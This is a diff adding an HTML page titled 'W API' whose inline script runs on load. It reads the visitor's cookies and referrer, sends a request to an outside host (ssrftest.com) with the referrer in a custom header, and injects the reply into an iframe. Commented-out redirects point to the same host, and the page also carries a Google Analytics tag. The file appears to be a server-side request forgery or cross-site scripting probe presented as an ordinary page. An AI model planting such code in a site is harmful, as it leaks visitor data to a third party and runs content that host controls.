@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <!--<meta http-equiv="refresh" content="0; URL=http://ssrftest.com/x/hCZ8o" />-->
+    <title>W API</title>
+<script>
+var reqck = document.cookie;
+var reqref = document.referrer;
+var xhr= new XMLHttpRequest();
+    xhr.open('GET', 'https://ssrftest.com/x/hCZ8o');
+    xhr.setRequestHeader('CustomHeader',reqref)
+    xhr.send();
+    xhr.onreadystatechange= function() {
+        if (this.readyState!==4) return;
+        if (this.status!==200) return;
+        var iframe = document.createElement('iframe');
+                iframe.srcdoc = this.responseText;
+                iframe.src = "text/plain," + escape(this.responseText);
+                document.body.appendChild(iframe);
+};
+xhr.send();
+
+</script> 
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-6PCK8E0Y9S"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-6PCK8E0Y9S');
+</script>
+    
+<!--<link rel="stylesheet" href="styles.css">-->
+</head>
+  <body>
+    <!--<p>If you are not redirected in five seconds, <a href="http://ssrftest.com/x/hCZ8o/">click here</a>.</p>-->
+  </body>
+</html>
